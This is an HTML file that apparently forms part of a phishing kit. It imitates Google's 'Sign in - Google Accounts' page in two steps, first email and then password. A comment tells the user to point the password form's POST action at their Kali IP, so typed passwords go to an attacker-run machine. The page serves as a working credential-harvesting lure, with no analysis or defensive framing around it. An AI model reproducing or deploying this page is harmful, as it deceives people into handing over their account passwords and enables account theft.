<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Sign in - Google Accounts</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="viewport-container">
        <!-- TOP LOGO SPACE (Add your G logo here) -->
        <div class="logo-area"></div>

        <!-- PAGE 1: SIGN IN (image_73.png) -->
        <div id="email-view">
            <h1>Sign in</h1>
            <p class="instruction">Use your Google Account</p>
            
            <form id="to-password">
                <div class="field-group">
                    <input type="text" id="email-input" required placeholder=" ">
                    <label>Email or phone</label>
                </div>
                
                <button type="button" class="blue-text-btn forgot">Forgot email?</button>
                
                <div class="action-row">
                    <button type="button" class="blue-text-btn">Create account</button>
                    <button type="submit" class="next-pill">Next</button>
                </div>
            </form>
        </div>

        <!-- PAGE 2: WELCOME (image_74.png) -->
        <div id="password-view" class="hidden">
            <h1>Welcome</h1>
            <div class="user-chip">
                <span id="chip-text"></span>
                <svg viewBox="0 0 24 24" width="18" height="18"><path d="M7 10l5 5 5-5z" fill="white"/></svg>
            </div>

            <!-- SET POST Action: Change '/' to your Kali IP if needed -->
            <form id="login-form" method="POST" action="/">
                <div class="field-group">
                    <input type="password" name="password" id="pass-input" required placeholder=" ">
                    <label>Enter your password</label>
                </div>

                <div class="checkbox-row">
                    <input type="checkbox" id="show-check">
                    <label for="show-check">Show password</label>
                </div>

                <div class="action-row password-footer">
                    <button type="button" class="blue-text-btn">Forgot password?</button>
                    <button type="submit" class="next-pill">Next</button>
                </div>
            </form>
        </div>

        <!-- FOOTER & LANGUAGE (image_73.png) -->
        <footer>
            <div class="lang-container">
                <div class="lang-selector" id="lang-btn">
                    English (United Kingdom) <span class="arrow-down"></span>
                </div>
                <div class="lang-dropdown hidden" id="lang-menu">
                    <div class="lang-item">Afrikaans</div>
                    <div class="lang-item">Deutsch</div>
                    <div class="lang-item selected">English (United Kingdom)</div>
                    <div class="lang-item">English (United States)</div>
                    <div class="lang-item">Español (España)</div>
                </div>
            </div>
            <div class="footer-links">
                <a href="#">Help</a>
                <a href="#">Privacy</a>
                <a href="#">Terms</a>
            </div>
        </footer>
    </div>
    <script src="script.js"></script>
</body>
</html>
